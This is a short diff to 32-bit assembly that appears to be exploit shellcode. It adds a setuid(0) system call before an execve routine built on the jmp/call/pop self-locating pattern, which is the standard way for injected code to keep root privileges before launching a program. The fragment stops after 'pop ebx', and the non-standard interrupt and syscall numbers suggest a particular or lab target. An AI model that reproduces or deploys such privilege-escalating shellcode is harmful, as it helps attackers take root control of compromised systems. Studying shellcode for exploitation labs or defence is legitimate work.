@@ -1,7 +1,12 @@
 BITS 32
 
 %define NR_execve 7
+%define NR_setuid 24
 
+    xor eax, eax
+    add al, NR_setuid
+    xor ebx, ebx
+    int 0x7f
     jmp short end
 start:
     pop ebx
